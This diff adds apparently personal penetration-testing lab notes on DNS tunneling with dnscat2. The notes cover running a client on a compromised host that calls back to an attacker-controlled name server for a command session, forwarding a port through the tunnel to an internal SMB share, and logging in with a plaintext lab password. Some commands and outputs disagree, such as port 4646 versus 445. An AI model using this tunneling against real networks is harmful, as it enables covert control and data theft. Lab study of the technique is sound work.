@@ -272,3 +272,107 @@ Authoritative answers can be found from:
 ```
 
 This is one way to get data into an internal network using DNS records. If we wanted to infiltrate binary data, we could serve it as a series of Base64 or ASCII hex encoded TXT records, and convert that back into binary on the internal server.
+
+
+### DNS Tunneling with dnscat2
+
+```
+10.4.219.215 PGDATABASE01
+192.168.219.7 FELINEAUTHORITY
+192.168.219.64 MULTISERVER03
+192.168.219.63 CONFLUENCE01
+172.16.219.217 HRSHARES
+```
+
+dnscat2 can be used to exfil data with DNS subdomain queries and infiltrate data with TXT or other records. A dnscat2 server runs on an authoritative name server for a domain and clients that are configged to make queries to that domain are run on compromised machines. 
+
+```console
+// inspect traffic from FELINEAUTHORITY
+feline$ sudo tcpdump -i ens192 udp port 53
+
+feline$ dnscat2-server feline.corp
+Starting Dnscat2 DNS server on 0.0.0.0:53
+
+pg$ cd dnscat/
+
+pg$ ./dnscat feline.corp
+Evites Lordy Horror Volume Barons Deepen 
+
+Session established!
+
+// check for connections back to our dnscat2 server
+kali$ dnscat2-server feline.corp
+New window created: 1
+Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
+For added security, please ensure the client displays the same string:
+
+>> Evites Lordy Horror Volume Barons Deepen
+```
+
+Requests from PGDATABSE01 are being resolved by MULTISERVER03 and end up at FELINEAUTHORITY.
+
+Watch our tcpdump to monitor the DNS Requests to feline.corp.
+
+```console
+22:58:34.715885 IP 192.168.219.64.55787 > 192.168.219.7.domain: 10268+ [1au] MX? 664c01979b0d4a8e4428bc00cf5797aafd.feline.corp. (75)
+22:58:34.716298 IP 192.168.219.7.domain > 192.168.219.64.55787: 10268 1/0/0 MX d1e701979bb7860434499affff30c27d27.feline.corp. 10 (126)
+22:58:35.719982 IP 192.168.219.64.55575 > 192.168.219.7.domain: 22929+ CNAME? dff701979b8e36a32f3c2900d0d6752881.feline.corp. (64)
+22:58:35.720434 IP 192.168.219.7.domain > 192.168.219.64.55575: 22929 1/0/0 CNAME 0f5601979b836b15836de4ffff30c27d27.feline.corp. (124)
+22:58:36.724108 IP 192.168.219.64.54641 > 192.168.219.7.domain: 45855+ [1au] CNAME? 849201979b3cd848fe5f6400d15837e6a8.feline.corp. (75)
+22:58:36.724550 IP 192.168.219.7.domain > 192.168.219.64.54641: 45855 1/0/0 CNAME 392f01979b6134422eb3b2ffff30c27d27.feline.corp. (124)
+22:58:37.727791 IP 192.168.219.64.54517 > 192.168.219.7.domain: 34287+ MX? a6c001979b65aeb775f3d100d2dd7e1d87.feline.corp. (64)
+22:58:37.728215 IP 192.168.219.7.domain > 192.168.219.64.54517: 34287 1/0/0 MX 847f01979b947537ee43f7ffff30c27d27.feline.corp. 10 (126)
+22:58:38.732005 IP 192.168.219.64.54947 > 192.168.219.7.domain: 24467+ [1au] MX? f21501979b0d9eef20a57300d3698c1004.feline.corp. (75)
+22:59:03.835132 IP 192.168.219.64.54272 > 192.168.219.7.domain: 35096+ TXT? 3c3f01979bdb59291a373300ec3a50e87b.feline.corp. (64)
+```
+
+We see CNAME, TXT, and MX queries and responses. Kill the tcpdump.
+
+It's time to interact with our session from the dnscat2 server.
+
+```console
+// list all active windows
+dnscat2> windows
+0 :: main [active]
+  crypto-debug :: Debug window for crypto stuff [*]
+  dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
+  1 :: command (pgdatabase01) [encrypted, NOT verified] [*]
+
+dnscat2> window -i 1
+New window created: 1
+history_size (session) => 1000
+Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
+For added security, please ensure the client displays the same string:
+
+>> Evites Lordy Horror Volume Barons Deepen
+This is a command session!
+
+That means you can enter a dnscat2 command such as
+'ping'! For a full list of clients, try 'help'.
+
+dnscat2> ?
+
+dnscat2> listen --help
+Error: The user requested help
+Listens on a local port and sends the connection out the other side (like ssh
+-L). Usage: listen [<lhost>:]<lport> <rhost>:<rport>
+  --help, -h:   Show this message
+
+// let's try to connect to the SMB port on HRSHARES through our DNS tunnel
+// set up local port forward
+
+dnscat2> listen 0.0.0.0:4455 172.16.219.217:4646
+Listening on 127.0.0.1:4455, sending connections to 172.16.219.217:445
+```
+
+From another shell on FELINEAUTHORITY, we can list the SMB shares through our port forward.
+
+```console
+feline$ smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
+
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        Scripts         Disk      
+        Users           Disk      
+```
